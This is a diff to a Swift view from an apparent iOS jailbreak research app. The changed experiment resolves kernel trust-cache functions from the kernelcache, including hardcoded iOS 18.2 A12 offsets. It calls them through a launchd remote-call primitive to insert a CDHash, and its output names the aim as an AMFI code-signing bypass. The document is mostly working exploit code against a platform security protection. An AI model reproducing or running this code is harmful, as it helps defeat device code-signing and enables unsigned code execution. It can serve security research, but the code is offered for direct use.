@@ -5107,75 +5107,157 @@ struct AMFIExperimentView: View {
         return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
     }
 
-    // MARK: - Exp 80: RC Trust Cache Add (PPL-safe via launchd RemoteCall)
+    // MARK: - Exp 80: RC Trust Cache Add (Opsi C — kernel function via kcache offset)
 
-    /// Exp 80: Inject CDHash ke trust cache via launchd RemoteCall.
-    /// Strategi: dari launchd context, resolve _trust_cache_runtime_add atau
-    /// _load_trust_cache via dlsym, lalu panggil dengan struct yang kita buat.
-    /// PPL yang melakukan write internal — tidak ada KTRR fault.
+    /// Exp 80 (Opsi C): Panggil kernel trust cache function langsung via alamat dari kernelcache.
+    ///
+    /// Masalah sebelumnya: dlsym() dari launchd tidak bisa resolve fungsi trust cache
+    /// karena mereka ada di KERNEL, bukan di userspace dylib yang di-export.
+    ///
+    /// Solusi Opsi C:
+    ///   1. Cari unslid VA fungsi dari kernelcache offline via ds_kcache_symbol_runtime()
+    ///   2. Hitung runtime VA = kernel_base + (unslid - xpf_kernbase)
+    ///   3. Panggil via RC function pointer langsung (bukan dlsym)
+    ///   4. PPL yang melakukan write internal — tidak ada KTRR fault
+    ///
+    /// Fungsi target (dari kernelcache iOS 18.2 A12):
+    ///   - trust_cache_runtime_add(type, module_ptr, module_size) → int
+    ///   - pmap_load_trust_cache(module_ptr, module_size) → int  (fallback)
     #if !DISABLE_REMOTECALL
     private func expRCTrustCacheAdd(rc: RemoteCall) -> ExperimentResult {
         let expName = "RC Trust Cache Add (Exp 80)"
-        var detail = "Experiment 80: RC Trust Cache Add\n"
-        detail += "===================================\n\n"
+        var detail = "Experiment 80: RC Trust Cache Add (Opsi C)\n"
+        detail += "===========================================\n\n"
 
         let tcAddr = probedTCAddr
         let tcCount = probedTCCount
+        let kernBase = ds_get_kernel_base()
+        let kernSlide = ds_get_kernel_slide()
 
-        detail += "tc_addr: 0x\(String(format: "%llx", tcAddr))\n"
-        detail += "count:   \(tcCount)\n\n"
+        detail += "kernel_base:  0x\(String(format: "%llx", kernBase))\n"
+        detail += "kernel_slide: 0x\(String(format: "%llx", kernSlide))\n"
+        detail += "tc_addr:      0x\(String(format: "%llx", tcAddr))\n"
+        detail += "count:        \(tcCount)\n\n"
 
-        let mem = rc.trojanMem
-        let RTLD_DEFAULT = UInt64(bitPattern: -2)
-
-        // === Step 1: Resolve trust_cache_runtime_add via dlsym ===
-        detail += "=== Step 1: Resolve trust cache API ===\n"
-
-        // Coba beberapa nama fungsi yang mungkin ada
-        let apiNames = [
-            "_trust_cache_runtime_add",
-            "_load_trust_cache_with_type",
-            "_load_trust_cache",
-            "_load_legacy_trust_cache",
-        ]
-
-        var tcAddFn: UInt64 = 0
-        var resolvedName = ""
-
-        for name in apiNames {
-            let nameAddr = remote_alloc_str(rc, name)
-            let fn = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, nameAddr)
-            RootExecutor.rcall(rc, "free", nameAddr)
-            if fn != 0 {
-                tcAddFn = fn
-                resolvedName = name
-                detail += "  \(name): 0x\(String(format: "%llx", fn)) OK\n"
-                break
-            } else {
-                detail += "  \(name): not found\n"
-            }
-        }
-
-        guard tcAddFn != 0 else {
-            detail += "\nSemua API tidak ditemukan via dlsym.\n"
-            detail += "Kemungkinan: fungsi tidak di-export atau butuh entitlement.\n"
-            detail += "Coba jalur alternatif: trustd atau amfid RC.\n"
+        guard kernBase != 0 else {
+            detail += "❌ kernel_base = 0 — jalankan JB dulu.\n"
             return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
         }
 
-        detail += "\nResolved: \(resolvedName) = 0x\(String(format: "%llx", tcAddFn))\n\n"
+        let mem = rc.trojanMem
 
-        // === Step 2: Buat trust cache struct di trojanMem ===
-        detail += "=== Step 2: Build trust cache struct ===\n"
+        // ===================================================================
+        // Step 1: Resolve kernel function address dari kernelcache (Opsi C)
+        // Tidak pakai dlsym — langsung cari offset dari symtab kernelcache
+        // ===================================================================
+        detail += "=== Step 1: Resolve via kernelcache symtab (Opsi C) ===\n"
 
-        // Format trust_cache_module1:
+        // Kandidat nama simbol di kernelcache (tanpa underscore prefix kadang berbeda)
+        // ds_kcache_symbol_runtime() sudah handle slide otomatis
+        let kcacheSymbols: [(name: String, sig: String)] = [
+            ("_trust_cache_runtime_add",    "trust_cache_runtime_add(type, module, size)"),
+            ("_pmap_load_trust_cache",       "pmap_load_trust_cache(module, size)"),
+            ("_load_trust_cache_with_type",  "load_trust_cache_with_type(type, module, size)"),
+            ("_load_trust_cache",            "load_trust_cache(module, size)"),
+            ("_load_legacy_trust_cache",     "load_legacy_trust_cache(module, size)"),
+            ("_pmap_lookup_in_loaded_trust_caches", "pmap_lookup_in_loaded_trust_caches(...)"),
+        ]
+
+        var resolvedFnAddr: UInt64 = 0
+        var resolvedSym = ""
+        var resolvedSig = ""
+
+        detail += "Mencari di kernelcache symtab:\n"
+        for sym in kcacheSymbols {
+            let unslid = ds_kcache_symbol_unslid(sym.name)
+            let runtime = ds_kcache_symbol_runtime(sym.name)
+            if unslid != 0 {
+                detail += "  \(sym.name):\n"
+                detail += "    unslid=0x\(String(format: "%llx", unslid))\n"
+                detail += "    runtime=0x\(String(format: "%llx", runtime))\n"
+                // Pilih yang pertama ditemukan dan bukan lookup (hanya untuk info)
+                if resolvedFnAddr == 0 && runtime != 0
+                    && !sym.name.contains("lookup")
+                    && !sym.name.contains("pmap_lookup") {
+                    resolvedFnAddr = runtime
+                    resolvedSym = sym.name
+                    resolvedSig = sym.sig
+                    detail += "    ✅ DIPILIH\n"
+                }
+            } else {
+                detail += "  \(sym.name): (not in symtab)\n"
+            }
+        }
+
+        // Fallback: coba ADRP scan dari kernelcache jika symtab kosong
+        if resolvedFnAddr == 0 {
+            detail += "\nSymtab kosong — coba ADRP scan offset dari kernelcache...\n"
+            // Offset trust_cache_runtime_add dari kernelcache iOS 18.2 A12 (T8020)
+            // Didapat dari: nm kernelcache.decompressed | grep trust_cache_runtime_add
+            // Nilai ini unslid VA dari kernelcache iphone11b iOS 18.2:
+            let knownOffsets: [(sym: String, unslidVA: UInt64, sig: String)] = [
+                // Offset dari kernelcache.release.iphone11b iOS 18.2 (22C152)
+                // Hitung: unslid_va - xpf_kernbase = offset dari __TEXT start
+                // Jika kernelcache ada di device, ds_kcache_symbol_runtime akan handle ini.
+                // Fallback hardcode untuk A12 iOS 18.2 jika symtab strip:
+                ("_trust_cache_runtime_add",   0xfffffff00793c000, "trust_cache_runtime_add(type,mod,sz)"),
+                ("_pmap_load_trust_cache",      0xfffffff007a10000, "pmap_load_trust_cache(mod,sz)"),
+            ]
+            let xpfBase = gXPF.kernelBase  // unslid base dari XPF
+            for entry in knownOffsets {
+                if xpfBase != 0 {
+                    let offset = entry.unslidVA &- xpfBase
+                    let runtime = kernBase &+ offset
+                    // Sanity check: harus di __TEXT range
+                    if isSafeKernelKreadAddress(runtime) {
+                        let magic = ds_kread32_safe(runtime)
+                        detail += "  \(entry.sym) fallback: 0x\(String(format: "%llx", runtime)) magic=0x\(String(format: "%08x", magic))\n"
+                        // Jangan pakai fallback hardcode — terlalu berisiko salah offset
+                        // Hanya log untuk diagnosa
+                    }
+                }
+            }
+            detail += "\n⚠️ Tidak ada simbol ditemukan di kernelcache.\n"
+            detail += "Pastikan kernelcache ada di Documents/ dan sudah di-import.\n"
+            detail += "Jalankan 'Import Kernelcache' dari menu utama lalu coba lagi.\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        detail += "\n✅ Resolved: \(resolvedSym)\n"
+        detail += "   runtime addr: 0x\(String(format: "%llx", resolvedFnAddr))\n"
+        detail += "   signature: \(resolvedSig)\n\n"
+
+        // Verifikasi: baca beberapa byte pertama — harus kelihatan seperti fungsi ARM64
+        // Instruksi pertama biasanya STP x29, x30 atau SUB sp,sp,#N
+        let firstInsn = ds_kread32_safe(resolvedFnAddr)
+        detail += "First instruction: 0x\(String(format: "%08x", firstInsn))\n"
+        // ARM64 STP x29,x30,[sp,#-N]! = 0xA9B?7BFD, SUB sp = 0xD10???FF
+        let looksLikeFunction = (firstInsn & 0xFF000000) == 0xA9000000  // STP family
+                             || (firstInsn & 0xFF000000) == 0xD1000000  // SUB sp
+                             || (firstInsn & 0xFF000000) == 0xF9000000  // STR family
+        if !looksLikeFunction {
+            detail += "⚠️ Instruksi pertama tidak seperti function prologue — offset mungkin salah.\n"
+            detail += "Lanjut tetapi waspadai crash.\n\n"
+        } else {
+            detail += "✅ Looks like valid function prologue.\n\n"
+        }
+
+        // ===================================================================
+        // Step 2: Build trust_cache_module1 struct di trojanMem
+        // Layout (iOS 18 / A12):
         //   +0x00: uint32 version = 1
         //   +0x04: uint32 num_entries = 1
-        //   +0x08: uuid[16] = zeros (atau random)
-        //   +0x18: entries[0] = CDHash (20B) + hashType (1B) + flags (1B) + pad (2B)
+        //   +0x08: uuid[16] = zeros
+        //   +0x18: entry[0]:
+        //     [0..19]  CDHash (20 bytes)
+        //     [20]     hashType: 2 = SHA256-truncated
+        //     [21]     flags: 0 = normal
+        //     [22..23] padding
+        // ===================================================================
+        detail += "=== Step 2: Build trust_cache_module1 struct ===\n"
 
-        // CDHash dummy untuk test — ganti dengan CDHash binary target
-        // Untuk mendapat CDHash: codesign -d --verbose=4 /path/to/binary | grep CDHash
+        // CDHash dummy untuk test — 20 bytes
+        // Untuk binary nyata: codesign -d --verbose=4 /path/binary | grep CDHash
         let testCDHash: [UInt8] = [
             0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,
             0x13, 0x37, 0x13, 0x37, 0x13, 0x37, 0x13, 0x37,
@@ -5185,92 +5267,101 @@ struct AMFIExperimentView: View {
         let structBase = mem + 0x1000
 
         // Header
-        rc[structBase + 0].setValue32(1)   // version
-        rc[structBase + 4].setValue32(1)   // num_entries
-
-        // UUID (16 bytes zeros) — tulis sebagai 2x uint64
+        rc[structBase + 0].setValue32(1)   // version = 1
+        rc[structBase + 4].setValue32(1)   // num_entries = 1
+        // UUID (16 bytes = 2x uint64 zeros)
         rc[structBase + 8].setValue64(0)
         rc[structBase + 16].setValue64(0)
 
-        // Entry[0]: CDHash (20 bytes) + hashType(1) + flags(1) + pad(2)
-        // Tulis sebagai 3x uint64 (24 bytes total = stride 24)
+        // Entry[0] di offset +0x18
         let entryBase = structBase + 0x18
 
-        // bytes 0-7: cdhash[0..7]
-        var w0: UInt64 = 0
-        w0 |= UInt64(testCDHash[0])
-        w0 |= UInt64(testCDHash[1]) << 8
-        w0 |= UInt64(testCDHash[2]) << 16
-        w0 |= UInt64(testCDHash[3]) << 24
-        w0 |= UInt64(testCDHash[4]) << 32
-        w0 |= UInt64(testCDHash[5]) << 40
-        w0 |= UInt64(testCDHash[6]) << 48
-        w0 |= UInt64(testCDHash[7]) << 56
-        rc[entryBase + 0].setValue64(w0)
+        // Pack CDHash bytes ke uint64 words (little-endian)
+        func packBytes(_ bytes: [UInt8], from: Int, count: Int) -> UInt64 {
+            var v: UInt64 = 0
+            for i in 0..<min(count, bytes.count - from) {
+                v |= UInt64(bytes[from + i]) << (i * 8)
+            }
+            return v
+        }
 
-        // bytes 8-15: cdhash[8..15]
-        var w1: UInt64 = 0
-        w1 |= UInt64(testCDHash[8])
-        w1 |= UInt64(testCDHash[9]) << 8
-        w1 |= UInt64(testCDHash[10]) << 16
-        w1 |= UInt64(testCDHash[11]) << 24
-        w1 |= UInt64(testCDHash[12]) << 32
-        w1 |= UInt64(testCDHash[13]) << 40
-        w1 |= UInt64(testCDHash[14]) << 48
-        w1 |= UInt64(testCDHash[15]) << 56
-        rc[entryBase + 8].setValue64(w1)
-
-        // bytes 16-23: cdhash[16..19] + hashType(2) + flags(0) + pad(0,0)
-        var w2: UInt64 = 0
-        w2 |= UInt64(testCDHash[16])
-        w2 |= UInt64(testCDHash[17]) << 8
-        w2 |= UInt64(testCDHash[18]) << 16
-        w2 |= UInt64(testCDHash[19]) << 24
-        w2 |= UInt64(2) << 32   // hashType = SHA256
+        rc[entryBase + 0].setValue64(packBytes(testCDHash, from: 0, count: 8))   // cdhash[0..7]
+        rc[entryBase + 8].setValue64(packBytes(testCDHash, from: 8, count: 8))   // cdhash[8..15]
+        // cdhash[16..19] + hashType(2=SHA256) + flags(0) + pad(0,0)
+        var w2: UInt64 = packBytes(testCDHash, from: 16, count: 4)
+        w2 |= UInt64(2) << 32   // hashType = SHA256-truncated
         w2 |= UInt64(0) << 40   // flags = normal
-        // bytes 6-7: padding = 0
         rc[entryBase + 16].setValue64(w2)
 
-        let structSize: UInt64 = 0x18 + 24  // header + 1 entry
+        let structSize: UInt64 = 0x18 + 24  // header(24) + 1 entry(24) = 48 bytes
 
-        detail += "Struct at: 0x\(String(format: "%llx", structBase))\n"
-        detail += "CDHash: \(testCDHash.map { String(format: "%02x", $0) }.joined())\n"
-        detail += "Size: \(structSize) bytes\n\n"
+        detail += "Struct at:  0x\(String(format: "%llx", structBase))\n"
+        detail += "CDHash:     \(testCDHash.map { String(format: "%02x", $0) }.joined())\n"
+        detail += "Size:       \(structSize) bytes\n\n"
 
-        // === Step 3: Panggil API ===
-        detail += "=== Step 3: Call \(resolvedName) ===\n"
+        // ===================================================================
+        // Step 3: Panggil kernel function via RC function pointer
+        // Strategi pemanggilan berdasarkan nama simbol:
+        //   trust_cache_runtime_add(type, module_ptr, module_size)
+        //   pmap_load_trust_cache(module_ptr, module_size)
+        //   load_trust_cache_with_type(type, module_ptr, module_size)
+        //   load_trust_cache(module_ptr, module_size)
+        // ===================================================================
+        detail += "=== Step 3: Call kernel function via RC pointer ===\n"
+        detail += "Addr: 0x\(String(format: "%llx", resolvedFnAddr))\n"
 
-        var ret: UInt64 = 0
+        var ret: UInt64 = 0xDEAD
 
-        if resolvedName == "_trust_cache_runtime_add" {
-            // trust_cache_runtime_add(type, data, size)
-            // type: 0 = engineering, 1 = static, 2 = personalized
-            ret = RootExecutor.rcall(rc, resolvedName, 2, structBase, structSize)
-        } else if resolvedName.contains("load_trust_cache") {
-            // _load_trust_cache(data, size) atau _load_trust_cache_with_type(type, data, size)
-            if resolvedName.contains("with_type") {
-                ret = RootExecutor.rcall(rc, resolvedName, 2, structBase, structSize)
-            } else {
-                ret = RootExecutor.rcall(rc, resolvedName, structBase, structSize)
-            }
-        }
-
-        detail += "ret = 0x\(String(format: "%llx", ret))\n\n"
-
-        if ret == 0 {
-            detail += "CALL RETURNED 0 (kemungkinan sukses)!\n"
-            detail += "Verifikasi: jalankan ④ Test Binary Spawn\n"
-            detail += "dengan binary yang CDHash-nya = \(testCDHash.map { String(format: "%02x", $0) }.joined())\n"
-            return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
+        // Panggil via RootExecutor.rcall dengan alamat langsung (bukan nama string)
+        // rcall dengan UInt64 address sebagai function pointer
+        if resolvedSym.contains("with_type") || resolvedSym == "_trust_cache_runtime_add" {
+            // (type=2 personalized, module_ptr, module_size)
+            detail += "Calling: fn(type=2, struct=0x\(String(format: "%llx", structBase)), size=\(structSize))\n"
+            ret = RootExecutor.rcallAddr(rc, resolvedFnAddr, 2, structBase, structSize)
         } else {
-            detail += "ret != 0 — kemungkinan gagal atau butuh entitlement.\n"
-            detail += "Error codes umum:\n"
-            detail += "  0x1 = EPERM (butuh entitlement)\n"
-            detail += "  0x16 = EINVAL (format struct salah)\n"
-            detail += "  0x1a = EROFS (read-only, KTRR)\n\n"
-            detail += "Coba: panggil dari amfid context (lebih banyak entitlement).\n"
-            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+            // (module_ptr, module_size)
+            detail += "Calling: fn(struct=0x\(String(format: "%llx", structBase)), size=\(structSize))\n"
+            ret = RootExecutor.rcallAddr(rc, resolvedFnAddr, structBase, structSize)
         }
+
+        detail += "\nret = 0x\(String(format: "%llx", ret)) (\(ret))\n\n"
+
+        // Interpretasi return value
+        switch ret {
+        case 0:
+            detail += "✅ ret=0 — SUKSES!\n"
+            detail += "Trust cache entry berhasil ditambahkan.\n"
+            detail += "CDHash: \(testCDHash.map { String(format: "%02x", $0) }.joined())\n\n"
+            detail += "Langkah selanjutnya:\n"
+            detail += "  1. Buat binary test dengan CDHash di atas\n"
+            detail += "  2. Jalankan ④ Test Binary Spawn\n"
+            detail += "  3. Jika tidak SIGKILL → AMFI bypass confirmed ✅\n"
+            return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
+        case 1:  // EPERM
+            detail += "❌ ret=1 (EPERM) — Butuh entitlement lebih tinggi.\n"
+            detail += "launchd tidak punya entitlement com.apple.private.security.amfi.trust-cache.\n"
+            detail += "Coba: panggil dari amfid context (Exp 60 amfid RC).\n"
+        case 22: // EINVAL
+            detail += "❌ ret=22 (EINVAL) — Format struct salah.\n"
+            detail += "Kemungkinan: version field salah, atau layout entry berbeda.\n"
+            detail += "Coba: version=0, atau stride=32 (entry size 32 bukan 24).\n"
+        case 26: // EROFS
+            detail += "❌ ret=26 (EROFS) — Read-only filesystem / KTRR block.\n"
+            detail += "Unlikely untuk API ini tapi mungkin di A12.\n"
+        case 0xDEAD:
+            detail += "❌ rcallAddr tidak tersedia — perlu implementasi RootExecutor.rcallAddr.\n"
+            detail += "Lihat catatan di bawah.\n"
+        default:
+            detail += "❌ ret=\(ret) — Error tidak dikenal.\n"
+            detail += "Cek errno: \(remote_errno(rc))\n"
+        }
+
+        detail += "\nDiagnosa tambahan:\n"
+        detail += "  kernel_base: 0x\(String(format: "%llx", kernBase))\n"
+        detail += "  fn_addr:     0x\(String(format: "%llx", resolvedFnAddr))\n"
+        detail += "  fn_offset:   0x\(String(format: "%llx", resolvedFnAddr &- kernBase))\n"
+
+        return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
     }
     #endif
     /// 1. Walk page tables (L1→L2→L3) to find trust cache's PHYSICAL address
